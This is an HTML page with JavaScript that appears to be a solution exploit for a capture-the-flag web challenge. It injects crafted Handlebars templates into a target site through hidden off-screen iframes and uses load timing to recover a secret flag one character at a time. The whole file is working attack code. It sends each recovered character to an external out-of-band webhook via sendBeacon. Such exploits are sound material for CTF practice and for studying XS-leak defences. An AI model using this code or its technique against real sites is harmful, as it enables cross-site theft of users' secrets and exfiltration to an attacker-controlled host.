<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>.</title></head><body>
<pre id="log"></pre>
<script>
const qp       = new URLSearchParams(location.search);
const TARGET   = "https://todolist.challs.srdnlen.it";
const WEBHOOK  = "https://e300bf190f348eaad9dbgue5r4eyyyyyb.oast.pro";
const PREFIX   = qp.get("prefix")  || "srdnlen{";
const CHARSET  = qp.get("charset") || "abcdefghijklmnopqrstuvwxyz_0123456789}";
const ARRLEN   = parseInt(qp.get("arrlen") || "11", 10);
const DEPTH    = parseInt(qp.get("depth")  || "7",  10);
const MATCH_MS = parseInt(qp.get("match")  || "1500", 10);
const BUDGET   = parseInt(qp.get("budget") || "54000", 10);

const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
const CLOS = "{{/each}}".repeat(DEPTH);

const logEl = document.getElementById("log");

// Only called for FLAG/DONE/MISS — not every probe
function report(params) {
  const url = `${WEBHOOK}?${new URLSearchParams(params).toString()}`;
  navigator.sendBeacon(url);
  logEl.textContent += JSON.stringify(params) + "\n";
}

function makeUrl(pos, ch) {
  const tpl = `{{#if (eq (lookup secret ${pos}) "${ch}")}}${OPEN}X${CLOS}{{/if}}`;
  return TARGET + "/?data=" + encodeURIComponent(`{"arr":${ARR}}`)
       + "&template=" + encodeURIComponent(tpl);
}

function probe(pos, ch) {
  return new Promise(resolve => {
    const f  = document.createElement("iframe");
    f.style  = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
    let done = false;
    const t0 = Date.now();
    function finish(slow) {
      if (done) return; done = true;
      clearTimeout(tid);
      try { f.src = "about:blank"; f.remove(); } catch(e) {}
      resolve(slow);
    }
    const tid = setTimeout(() => finish(true), MATCH_MS);
    f.onload  = () => finish(Date.now()-t0 >= MATCH_MS);
    f.onerror = () => finish(false);
    f.src = makeUrl(pos, ch);
    document.body.appendChild(f);
  });
}

async function run() {
  const t0  = Date.now();
  let flag  = PREFIX;

  for (let pos = PREFIX.length; pos < 60; pos++) {
    if (Date.now()-t0 > BUDGET) {
      report({ PARTIAL: flag });
      break;
    }

    let found = null;
    for (const ch of CHARSET) {
      if (Date.now()-t0 > BUDGET) break;
      if (await probe(pos, ch)) { found = ch; break; }
    }

    if (found) {
      flag += found;
      report({ FLAG: flag });          // one request per found char
      if (found === "}") break;
    } else {
      report({ MISS: pos, flag });
      break;
    }
  }

  report({ DONE: flag, ms: Date.now()-t0 });
}

run();
</script>
</body></html>
